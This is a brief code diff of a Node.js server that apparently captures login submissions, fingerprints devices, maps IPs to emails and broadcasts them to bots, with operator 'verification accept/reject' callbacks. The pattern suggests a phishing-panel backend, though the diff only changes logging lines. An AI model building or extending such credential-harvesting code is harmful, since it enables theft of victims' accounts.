@@ -51,7 +51,6 @@ function getDeviceFingerprint(req) {
     const combined = `${userAgent}|${language}|${encoding}`;
     const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
     
-    console.log(`🖐️ Device Fingerprint: ${fingerprint}`);
     return fingerprint;
   } catch (err) {
     return null;
@@ -270,7 +269,7 @@ app.post("/send-login", async (req, res) => {
       ipToEmail[ip] = email;
     }
 
-    console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
+    console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
 
     // ============================================================================
     // ✅ SEND TO BOTH BOTS (BROADCAST)
@@ -535,7 +534,6 @@ app.post("/update-status", (req, res) => {
     const action = req.body.action;
     const status = req.body.status;
     
-    console.log(`📬 Update Status Received: ${identifier}, action: ${action}, status: ${status}`);
 
     // ✅ Handle verification confirm callbacks
     if (action === "verification_accept" || action === "verification_reject") {
